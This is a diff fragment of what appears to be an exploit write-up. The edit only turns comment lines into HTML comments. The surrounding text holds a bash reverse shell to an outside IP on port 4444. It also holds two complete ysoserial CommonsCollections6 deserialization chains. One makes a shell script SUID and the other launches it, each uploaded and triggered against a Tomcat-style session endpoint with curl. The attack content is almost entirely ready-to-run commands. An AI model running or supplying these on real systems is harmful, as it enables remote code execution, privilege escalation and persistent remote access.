@@ -48,22 +48,22 @@ bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
 The payload used to set the SUID was:
 ---
 java -jar /home/user/ysoserial.jar CommonsCollections6 'chmod u+s /tmp/reverse_shell.sh' > payload.bin
-# Get session ID
+<!-- # Get session ID -->
 SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
-# Upload payload
+<!-- # Upload payload -->
 curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
-# Trigger payload 
+<!-- # Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ---
 
 The payload used setid and ran the shell was:
 ---
 java -jar /home/user/ysoserial.jar CommonsCollections6 'setsid bash /tmp/reverse_shell.sh >/dev/null 2>&1 &' > payload.bin
-# Get session ID
+<!-- # Get session ID -->
 SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
-# Upload payload
+<!-- # Upload payload -->
 curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
-# Trigger payload
+<!-- # Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ---
 
